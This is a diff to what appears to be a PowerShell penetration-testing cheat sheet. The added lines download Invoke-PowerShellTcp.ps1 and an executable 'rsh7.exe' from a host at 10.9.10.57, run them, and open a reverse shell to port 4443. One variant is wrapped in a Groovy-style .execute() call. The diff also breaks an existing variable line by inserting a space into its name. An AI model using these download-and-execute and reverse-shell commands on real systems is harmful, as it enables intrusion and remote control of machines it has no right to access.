@@ -12,4 +12,13 @@ Get-ChildItem -Path C:\Windows -File -Recurse -Hidden -ErrorAction SilentlyConti
 
 
 # Get system proxy
-    $webproxy = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
+    $ webproxy = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
+
+# powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.10.57:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.10.57 -Port 4443
+"powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.10.57:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.10.57 -Port 4443".execute()
+
+# powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.10.57:8080/rsh7.exe','rsh7.exe')"
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.10.57:8080/rsh7.exe');Start-Process "rsh7.exe"
